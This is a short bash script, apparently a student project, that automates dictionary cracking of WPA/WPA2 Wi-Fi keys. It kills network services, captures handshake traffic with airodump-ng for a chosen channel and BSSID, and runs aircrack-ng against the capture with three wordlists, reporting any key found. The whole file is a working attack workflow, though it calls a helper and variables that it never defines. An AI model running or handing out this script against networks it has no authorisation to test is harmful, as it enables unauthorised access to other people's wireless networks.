#@uthor Sai Prathik
#Title: Shell script to automate Aircrack tool. Cracking Wireless WPA/WPA2 keys using Dictionary bruteforce attack. 

#!/bin/bash 


killall NetworkManager
killall NetworkManagerDispatcher
killall wpa_supplicant
killall avahi-daemon

custom_timeout 10 "airodump-ng wlan0mon"


custom_timeout 10 "airodump-ng -c $channel -w /root/six --bssid $bssid wlan0mon"


aircrack-ng -w /root/Desktop/mini_project/crunch.txt /root/six-01.cap | tee password.txt

cat password.txt | grep -q "KEY"

if [ $? = 0 ]; then
	keyfoundvar=1
	echo "Key 1 Found"
else 
	keyfoundvar=0
	echo "Key 1 Not Found"
fi
sleep 5
aircrack-ng -w /root/Desktop/mini_project/crunch_1to5.txt /root/six-01.cap | tee password2.txt
cat password2.txt | grep -q "KEY"

if [ $? = 0 ]; then
	keyfoundvar2=1
	echo "Key 2 Found"
else 
	keyfoundvar2=0
	echo "Key 2 Not Found"
fi
sleep 5
aircrack-ng -w /root/Desktop/mini_project/abc123.txt /root/six-01.cap | tee password3.txt
cat password3.txt | grep -q "KEY"

if [ $? = 0 ]; then
	keyfoundvar3=1
	echo "Key 3 Found"
else 
	keyfoundvar3=0
	echo "Key 3 Not Found"
fi


